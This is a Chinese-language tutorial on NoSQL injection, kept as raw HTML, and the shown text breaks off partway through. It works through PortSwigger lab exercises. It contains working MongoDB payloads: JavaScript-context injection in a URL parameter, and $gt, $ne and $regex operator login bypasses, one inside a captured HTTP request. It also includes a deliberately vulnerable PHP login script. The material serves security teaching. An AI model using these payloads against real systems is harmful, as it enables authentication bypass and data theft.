    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    WEB
  </span>
</span>
</a
              >
            
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/nosql/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    NOSQL
  </span>
</span>
</a
              >
            
          
        
      
    </div>
  

  
  



      </div>
      
    </header>

    
    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
      
      
      
      
        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
          <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
            
              <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#0x001-nosql-database">0x001 NoSQL database</a></li>
    <li><a href="#0x002nosql-database-models">0x002NoSQL database models</a></li>
    <li><a href="#0x003注入的类型">0x003注入的类型</a></li>
    <li><a href="#0x004判断是否存在注入点">0x004判断是否存在注入点</a></li>
    <li><a href="#inject-function">Inject function</a>
      <ul>
        <li><a href="#重言式注入">重言式注入</a></li>
        <li><a href="#运算符注入">运算符注入</a></li>
        <li><a href="#联合查询注入">联合查询注入</a></li>
        <li><a href="#使用-command-方法造成的注入">使用 Command 方法造成的注入</a></li>
        <li><a href="#盲注">盲注</a>
          <ul>
            <li><a href="#布尔盲注">布尔盲注</a></li>
            <li><a href="#时间盲注">时间盲注</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#利用nosql-注入提取数据">利用NoSQL 注入提取数据</a>
          <ul>
            <li><a href="#识别字段名称">识别字段名称</a></li>
          </ul>
        </li>
        <li><a href="#利用nosql运算符注入来提取数据">利用NoSQL运算符注入来提取数据</a>
          <ul>
            <li><a href="#提取字段名称">提取字段名称</a></li>
          </ul>
        </li>
        <li><a href="#lab">lab</a></li>
      </ul>
    </li>
    <li><a href="#javascript运算符提取数据">javascript运算符提取数据</a></li>
  </ul>

  <ul>
    <li><a href="#什么是influxdb">什么是InfluxDB</a></li>
    <li><a href="#influxdb的数据组织">influxDB的数据组织</a></li>
    <li><a href="#写入数据的一些操作">写入数据的一些操作</a>
      <ul>
        <li><a href="#measurement">measurement</a></li>
        <li><a href="#tag-set">Tag set</a></li>
        <li><a href="#field-set">Field set</a></li>
        <li><a href="#timestamp">Timestamp</a>
          <ul>
            <li><a href="#关于时间戳的重要说明from-docs">关于时间戳的重要说明(from docs)</a></li>
          </ul>
        </li>
        <li><a href="#其他的一些东西">其他的一些东西</a>
          <ul>
            <li><a href="#quotes单引号">Quotes(单引号)</a></li>
            <li><a href="#special-characters一些特殊的字符">Special Characters(一些特殊的字符<code>\</code>)</a></li>
          </ul>
        </li>
        <li><a href="#model-of-lp">model of LP</a></li>
      </ul>
    </li>
    <li><a href="#查询的操作">查询的操作</a>
      <ul>
        <li><a href="#flux语法">Flux语法</a>
          <ul>
            <li><a href="#基本格式">基本格式</a></li>
            <li><a href="#pipe-forward-operator管道转发符">Pipe-forward operator(管道转发符)</a></li>
          </ul>
        </li>
        <li><a href="#influxql语法">influxQL语法</a>
          <ul>
            <li><a href="#基本的查询知识">基本的查询知识</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#注入利用">注入利用</a>
      <ul>
        <li><a href="#构建一个易被攻击的web">构建一个易被攻击的web</a></li>
        <li><a href="#构建一些playload">构建一些playload</a>
          <ul>
            <li><a href="#泄露bucket的名称">泄露bucket的名称</a></li>
            <li><a href="#泄露bucket及其相关数据">泄露bucket及其相关数据</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#ssrf利用">SSRF利用</a></li>
    <li><a href="#xss利用">XSS利用</a></li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#0x001-nosql-database">0x001 NoSQL database</a></li>
    <li><a href="#0x002nosql-database-models">0x002NoSQL database models</a></li>
    <li><a href="#0x003注入的类型">0x003注入的类型</a></li>
    <li><a href="#0x004判断是否存在注入点">0x004判断是否存在注入点</a></li>
    <li><a href="#inject-function">Inject function</a>
      <ul>
        <li><a href="#重言式注入">重言式注入</a></li>
        <li><a href="#运算符注入">运算符注入</a></li>
        <li><a href="#联合查询注入">联合查询注入</a></li>
        <li><a href="#使用-command-方法造成的注入">使用 Command 方法造成的注入</a></li>
        <li><a href="#盲注">盲注</a>
          <ul>
            <li><a href="#布尔盲注">布尔盲注</a></li>
            <li><a href="#时间盲注">时间盲注</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#利用nosql-注入提取数据">利用NoSQL 注入提取数据</a>
          <ul>
            <li><a href="#识别字段名称">识别字段名称</a></li>
          </ul>
        </li>
        <li><a href="#利用nosql运算符注入来提取数据">利用NoSQL运算符注入来提取数据</a>
          <ul>
            <li><a href="#提取字段名称">提取字段名称</a></li>
          </ul>
        </li>
        <li><a href="#lab">lab</a></li>
      </ul>
    </li>
    <li><a href="#javascript运算符提取数据">javascript运算符提取数据</a></li>
  </ul>

  <ul>
    <li><a href="#什么是influxdb">什么是InfluxDB</a></li>
    <li><a href="#influxdb的数据组织">influxDB的数据组织</a></li>
    <li><a href="#写入数据的一些操作">写入数据的一些操作</a>
      <ul>
        <li><a href="#measurement">measurement</a></li>
        <li><a href="#tag-set">Tag set</a></li>
        <li><a href="#field-set">Field set</a></li>
        <li><a href="#timestamp">Timestamp</a>
          <ul>
            <li><a href="#关于时间戳的重要说明from-docs">关于时间戳的重要说明(from docs)</a></li>
          </ul>
        </li>
        <li><a href="#其他的一些东西">其他的一些东西</a>
          <ul>
            <li><a href="#quotes单引号">Quotes(单引号)</a></li>
            <li><a href="#special-characters一些特殊的字符">Special Characters(一些特殊的字符<code>\</code>)</a></li>
          </ul>
        </li>
        <li><a href="#model-of-lp">model of LP</a></li>
      </ul>
    </li>
    <li><a href="#查询的操作">查询的操作</a>
      <ul>
        <li><a href="#flux语法">Flux语法</a>
          <ul>
            <li><a href="#基本格式">基本格式</a></li>
            <li><a href="#pipe-forward-operator管道转发符">Pipe-forward operator(管道转发符)</a></li>
          </ul>
        </li>
        <li><a href="#influxql语法">influxQL语法</a>
          <ul>
            <li><a href="#基本的查询知识">基本的查询知识</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#注入利用">注入利用</a>
      <ul>
        <li><a href="#构建一个易被攻击的web">构建一个易被攻击的web</a></li>
        <li><a href="#构建一些playload">构建一些playload</a>
          <ul>
            <li><a href="#泄露bucket的名称">泄露bucket的名称</a></li>
            <li><a href="#泄露bucket及其相关数据">泄露bucket及其相关数据</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#ssrf利用">SSRF利用</a></li>
    <li><a href="#xss利用">XSS利用</a></li>
  </ul>
</nav>
  </div>
</details>


<script>
  (function () {
    'use strict'

    const SCROLL_OFFSET_RATIO = 0.33
    const TOC_SELECTOR = '#TableOfContents'
    const ANCHOR_SELECTOR = '.anchor'
    const TOC_LINK_SELECTOR = 'a[href^="#"]'
    const NESTED_LIST_SELECTOR = 'li ul'
    const ACTIVE_CLASS = 'active'

    function getActiveAnchorId(anchors, offsetRatio) {
      const threshold = window.scrollY + window.innerHeight * offsetRatio
      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))

      for (let i = anchors.length - 1; i >= 0; i--) {
        const top = anchors[i].getBoundingClientRect().top + window.scrollY
        if (top <= threshold && tocIds.has(anchors[i].id)) {
          return anchors[i].id
        }
      }
      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
    }

    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
      const activeId = getActiveAnchorId(anchors, scrollOffset)
      if (!activeId) return

      links.forEach(link => {
        const isActive = link.getAttribute('href') === `#${activeId}`
        link.classList.toggle(ACTIVE_CLASS, isActive)

        if (collapseInactive) {
          const ul = link.closest('li')?.querySelector('ul')
          if (ul) ul.style.display = isActive ? '' : 'none'
        }
      })

      if (collapseInactive) {
        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
        let el = activeLink
        while (el && el !== toc) {
          if (el.tagName === 'UL') el.style.display = ''
          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
          el = el.parentElement
        }
      }
    }

    function initTOC() {
      const toc = document.querySelector(TOC_SELECTOR)
      if (!toc) return

      const collapseInactive = false
      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]

      if (collapseInactive) {
        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
      }

      const config = {
        toc,
        anchors,
        links,
        scrollOffset: SCROLL_OFFSET_RATIO,
        collapseInactive
      }

      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })

      updateTOC(config)
    }

    document.readyState === 'loading'
      ? document.addEventListener('DOMContentLoaded', initTOC)
      : initTOC()
  })()
</script>


            
            
          </div>
        </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        

        <div class="article-content max-w-prose mb-20">
          <h1 class="relative group">NoSQL Inject 
    <div id="nosql-inject" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#nosql-inject" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>NoSQL(NOT ONLY SQL)，它和我们常见的sql注入很像。
它的危害有：</p>
<ul>
<li>绕过身份验证或保护机制。</li>
<li>提取或编辑数据。</li>
<li>导致拒绝服务。</li>
<li>在服务器上执行代码。
其实注入的本质都是一样的，只是语法有些不一样</li>
</ul>

<h2 class="relative group">0x001 NoSQL database 
    <div id="0x001-nosql-database" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#0x001-nosql-database" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>NoSQL 数据库以传统 SQL 关系表以外的格式存储和检索数据。它们旨在处理大量非结构化或半结构化数据。因此，它们通常比 SQL 具有更少的关系约束和一致性检查，并且在可扩展性、灵活性和性能方面具有显着的优势。</p>
<p>与 SQL 数据库一样，用户使用应用程序传递到数据库的查询与 NoSQL 数据库中的数据进行交互。然而，不同的NoSQL数据库使用多种查询语言，而不是像SQL（结构化查询语言）这样的通用标准。这可能是自定义查询语言或通用语言（如 XML 或 JSON）。（所以黑客可以使用过程性的语言而不是sql来进行攻击，并且可能会比传统的sql注入更具有危害性。）</p>
<p>NoSQL 数据库不支持一种标准化查询语言，因此允许的确切查询取决于：</p>
<ul>
<li><strong>数据库引擎</strong>— 例如 MongoDB、Cassandra、Redis 或 Google Bigtable</li>
<li><strong>编程语言</strong>— 例如 Python、PHP</li>
<li><strong>开发框架</strong>——例如 Angular、Node.js</li>
</ul>

<h2 class="relative group">0x002NoSQL database models 
    <div id="0x002nosql-database-models" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#0x002nosql-database-models" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">类型</th>
          <th style="text-align: right">部分代表</th>
          <th style="text-align: center">特点</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">列存储</td>
          <td style="text-align: right">Hbase<br><br>Cassandra<br><br>Hypertable</td>
          <td style="text-align: center">顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。</td>
      </tr>
      <tr>
          <td style="text-align: left">文档存储</td>
          <td style="text-align: right">MongoDB<br><br>CouchDB</td>
          <td style="text-align: center">文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。</td>
      </tr>
      <tr>
          <td style="text-align: left">key-value存储</td>
          <td style="text-align: right">Tokyo Cabinet / Tyrant<br><br>Berkeley DB<br><br>MemcacheDB<br><br>Redis</td>
          <td style="text-align: center">可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能）</td>
      </tr>
      <tr>
          <td style="text-align: left">图存储</td>
          <td style="text-align: right">Neo4J<br><br>FlockDB</td>
          <td style="text-align: center">图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。</td>
      </tr>
      <tr>
          <td style="text-align: left">对象存储</td>
          <td style="text-align: right">db4o<br><br>Versant</td>
          <td style="text-align: center">通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。</td>
      </tr>
      <tr>
          <td style="text-align: left">xml数据库</td>
          <td style="text-align: right">Berkeley DB XML<br><br>BaseX</td>
          <td style="text-align: center">高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。</td>
      </tr>
  </tbody>
</table>

<h2 class="relative group">0x003注入的类型 
    <div id="0x003注入的类型" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#0x003%e6%b3%a8%e5%85%a5%e7%9a%84%e7%b1%bb%e5%9e%8b" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>有两种 NoSQL 注入分类的方式：</p>
<p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p>
<p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
<ul>
<li><strong>重言式注入</strong></li>
</ul>
<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
<ul>
<li><strong>联合查询注入</strong></li>
</ul>
<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
<ul>
<li><strong>JavaScript 注入</strong></li>
</ul>
<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
<ul>
<li><strong>盲注</strong></li>
</ul>
<p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。
在portswigger中的解释：</p>
<ul>
<li>语法注入</li>
<li>当您可以破坏 NoSQL 查询语法，从而使您能够注入自己的有效负载时，就会发生这种情况。该方法与 SQL 注入中使用的方法类似。然而，攻击的性质差异很大，因为 NoSQL 数据库使用一系列查询语言、查询语法类型和不同的数据结构。</li>
<li>运算符注入 - 当您可以使用 NoSQL 查询运算符来操作查询时，就会发生这种情况。</li>
</ul>

<h2 class="relative group">0x004判断是否存在注入点 
    <div id="0x004判断是否存在注入点" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#0x004%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e5%ad%98%e5%9c%a8%e6%b3%a8%e5%85%a5%e7%82%b9" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>这里我就拿portswigger的在线lab做例子，就不额外搭建环境了







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nsql1.png">

  
</figure>

这里首先是一个商城的界面，随便点击一个category
url: /filter?category=Accessories
可以看见这里有类似于查询的意思，我们输入一个单引号试试







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql2.png">

  
</figure>

可以看见报错了，报错内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">Command</span> <span class="n">failed</span> <span class="n">with</span> <span class="n">error</span> <span class="mi">139</span> <span class="p">(</span><span class="n">JSInterpreterFailure</span><span class="p">)</span><span class="o">:</span> <span class="err">&#39;</span><span class="nl">SyntaxError</span><span class="p">:</span> <span class="n">unterminated</span> <span class="n">string</span> <span class="nl">literal</span> <span class="p">:</span> <span class="n">functionExpressionParser</span><span class="err">@</span><span class="n">src</span><span class="o">/</span><span class="n">mongo</span><span class="o">/</span><span class="n">scripting</span><span class="o">/</span><span class="n">mozjs</span><span class="o">/</span><span class="n">mongohelpers</span><span class="p">.</span><span class="nl">js</span><span class="p">:</span><span class="mi">46</span><span class="o">:</span><span class="mi">25</span> <span class="err">&#39;</span> <span class="n">on</span> <span class="n">server</span> <span class="mf">127.0.0.1</span><span class="o">:</span><span class="mf">27017.</span> <span class="n">The</span> <span class="n">full</span> <span class="n">response</span> <span class="n">is</span> <span class="p">{</span><span class="s">&#34;ok&#34;</span><span class="o">:</span> <span class="mf">0.0</span><span class="p">,</span> <span class="s">&#34;errmsg&#34;</span><span class="o">:</span> <span class="s">&#34;SyntaxError: unterminated string literal :</span><span class="se">\n</span><span class="s">functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;code&#34;</span><span class="o">:</span> <span class="mi">139</span><span class="p">,</span> <span class="s">&#34;codeName&#34;</span><span class="o">:</span> <span class="s">&#34;JSInterpreterFailure&#34;</span><span class="p">}</span>
</span></span></code></pre></div><p>很明显可以看见mogodb的操作。那么我们还要判断他是否会把url的内容带入数据库查询，所以我们构造<code>Accessories'&amp;&amp; 0 &amp;&amp; 'x</code>







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql3.png">

  
</figure>

可以看见是返回正常的，说明这里存在注入,我们再构造一次为真的条件，就会发现会返回所有商品信息，playload:https://xxxxxxxxxxxxx.web-security-academy.net/filter?category=accessories%27%7c%7c1%7c%7c%27</p>
<p>也就是accessories&rsquo;||&lsquo;1&rsquo;==&lsquo;1&rsquo;







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql4.png">

  
</figure>
</p>

<h2 class="relative group">Inject function 
    <div id="inject-function" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#inject-function" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">重言式注入 
    <div id="重言式注入" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e9%87%8d%e8%a8%80%e5%bc%8f%e6%b3%a8%e5%85%a5" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">db</span><span class="o">.</span><span class="nx">users</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span><span class="s2">&#34;username&#34;</span><span class="o">:</span> <span class="nx">userInputUsername</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="o">:</span> <span class="nx">userInputPassword</span><span class="p">});</span>
</span></span></code></pre></div><p>攻击者可以构造{&quot;$gt&quot;:&quot;&quot;}来进行绕过</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">db</span><span class="o">.</span><span class="nx">users</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span><span class="s2">&#34;username&#34;</span><span class="o">:</span> <span class="s2">&#34;administrator&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;</span><span class="si">$gt</span><span class="s2">&#34;</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">}});</span>
</span></span></code></pre></div><p>MongoDB 中的运算<code>&quot;$gt&quot;</code>符的意思是“大于”。通过将该值设置为空字符串，攻击者可以绕过身份验证，因为查询将返回用户名和密码大于空字符串的第一个用户。</p>
<p>这里也放一下Marcus_Holloway师傅的index.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$manager</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Manager</span><span class="p">(</span><span class="s2">&#34;mongodb://127.0.0.1:27017&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="nv">$password</span>
</span></span><span class="line"><span class="cl"><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;test.users&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$count</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="nv">$user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;====Login Success====&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;username:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;password:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Login Failed&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>正常用户登录的时候</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">username</span><span class="o">=</span><span class="n">whoami</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">657260</span>
</span></span></code></pre></div><p>其实执行的命令和我上面举的例子是一样的
如果这个时候传参</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">username</span><span class="p">[</span><span class="err">$</span><span class="n">ne</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="n">password</span><span class="p">[</span><span class="err">$</span><span class="n">ne</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span>
</span></span></code></pre></div><p>这样也可构造出一个true，也就是和我们sql注入中的万能密码<strong>admin&rsquo; or 1=1&ndash;+</strong> 一个原理，就是构造永真条件</p>

<h3 class="relative group">运算符注入 
    <div id="运算符注入" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e8%bf%90%e7%ae%97%e7%ac%a6%e6%b3%a8%e5%85%a5" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>NoSQL 数据库经常使用查询运算符，它提供了指定数据必须满足的条件才能包含在查询结果中的方法。 MongoDB 查询运算符的示例包括：</p>
<ul>
<li><code>$where</code>- 匹配满足 JavaScript 表达式的文档。</li>
<li><code>$ne</code>- 匹配所有不等于指定值的值。</li>
<li><code>$in</code>- 匹配数组中指定的所有值。</li>
<li><code>$regex</code>- 选择值与指定正则表达式匹配的文档。</li>
</ul>
<p>对于基于 URL 的输入，您可以通过 URL 参数插入查询运算符。例如，<code>username=wiener</code>变为 <code>username[$ne]=invalid</code>.如果这不起作用，您可以尝试以下操作：</p>
<ol>
<li>将请求方法从 转换<code>GET</code>为<code>POST</code>.</li>
<li>将<code>Content-Type</code>标题更改为<code>application/json</code>.</li>
<li>将 JSON 添加到消息正文。</li>
<li>在 JSON 中注入查询运算符。
进来有个login页面







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql5.png">

  
</figure>

抓个包看看</li>
</ol>
<pre tabindex="0"><code>POST /login HTTP/1.1
Host: xxxxxxxxxxxxx.web-security-academy.net
Cookie: session=djMoS9NuJRKCDsBfzRpHwzdkyy9EqZEC
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://xxxxxxxxxxx7.web-security-academy.net/login
Content-Type: application/json
Content-Length: 39
Origin: https://xxxxxxxxxxx.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;admin&#34;}
</code></pre><p>可以看见最后面传了json格式的文件
我们看见题目要求登录admin的账户，所以就构造playload
playload：
{&ldquo;username&rdquo;:{&quot;$regex&quot;:&ldquo;admin.*&rdquo;},
&ldquo;password&rdquo;:{&quot;$ne&quot;:&quot;&quot;}}







<figure>
